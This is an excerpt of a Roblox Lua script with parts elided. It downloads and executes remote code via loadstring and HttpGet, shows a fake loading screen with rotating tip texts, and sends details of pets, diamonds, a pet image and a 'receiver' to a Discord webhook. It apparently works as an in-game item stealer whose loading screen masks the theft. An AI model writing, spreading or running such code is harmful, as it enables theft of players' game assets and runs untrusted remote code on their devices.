...
if _G.LoadingScreen ~= false then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Azurexc/Loadscreen/main/Ls/lua'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
end
...
local function SNUMK_fake_script()
	...
	while true do
		wait(5)
		tip.Text = _G.LoadingText1
		wait(5)
		tip.Text = _G.LoadingText2
		wait(5)
		tip.Text = _G.LoadingText3
		wait(5)
		tip.Text = _G.LoadingText4
		wait(5)
		tip.Text = _G.LoadingText5
	end
end
...
local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
    ...
    if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
        imgs =
        "https://cdn.discordapp.com/attachments/1142120499783139458/1142847287282901002/attachment_93255996.jpg"
        data1 = {
            ["content"] = ping,
